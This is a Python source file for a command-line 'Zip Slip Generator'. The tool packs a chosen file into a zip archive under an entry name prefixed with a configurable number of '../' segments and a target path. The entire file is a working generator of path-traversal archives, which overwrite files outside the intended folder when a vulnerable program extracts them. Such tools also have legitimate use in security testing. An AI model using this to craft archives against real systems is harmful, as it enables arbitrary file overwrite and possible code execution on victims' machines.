import zipfile
import argparse 


def parse_args():
    parser = argparse.ArgumentParser(
                    prog='Zip Slip Generator',
                    description='Compress the given file appending parent directory the amount of times passed as argument with the -D flag.',)
    parser.add_argument('-F', '--file', help='File to zip', required=True)
    parser.add_argument('-D', '--depth', help='Depth of the parent directory', required=True)
    parser.add_argument('-P', '--path', help='Path to append after parent directory')
    parser.add_argument('-O', '--output', help='The filename of the zip file', required=True)
    args = parser.parse_args()
    return args


def compress_file(filename, output, path):
    with zipfile.ZipFile(file=output, mode='w', compression=zipfile.ZIP_DEFLATED) as zip_file:
        zip_file.write(filename, arcname=(path+filename))


def main():
    args = parse_args()
    zip_slip_path = '../' * int(args.depth) + args.path if args.path else ''
    compress_file(args.file, args.output, path=zip_slip_path)


if __name__ == "__main__":
    main()